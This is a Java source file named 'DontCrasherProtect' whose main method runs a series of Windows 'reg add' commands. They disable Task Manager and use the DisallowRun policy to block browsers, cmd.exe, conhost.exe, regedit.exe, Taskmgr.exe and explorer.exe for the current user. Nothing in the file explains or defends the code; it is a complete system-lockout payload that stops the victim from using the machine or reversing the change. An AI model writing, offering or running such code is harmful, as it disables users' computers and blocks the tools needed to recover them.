package uuu;

import java.io.IOException;

public class DontCrasherProtect {
	
	public static String prog1 = "chrome.exe";
	public static String prog2 = "firefox.exe";
	public static String prog3 = "edge.exe";
	public static String prog4 = "firefox.exe";
	public static String prog5 = "cmd.exe";
	public static String prog6 = "conhost.exe";
	public static String prog7 = "regedit.exe";
	public static String prog8 = "Taskmgr.exe";
	public static String prog9 = "explorer.exe";
	
	public static void main(String args[]) throws IOException {
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 1 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 2 /t REG_SZ /d " + prog2 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 3 /t REG_SZ /d " + prog3 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 4 /t REG_SZ /d " + prog4 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 5 /t REG_SZ /d " + prog5 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 6 /t REG_SZ /d " + prog6 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 7 /t REG_SZ /d " + prog7 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 8 /t REG_SZ /d " + prog8 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 9 /t REG_SZ /d " + prog9 + " /f");
	}
}
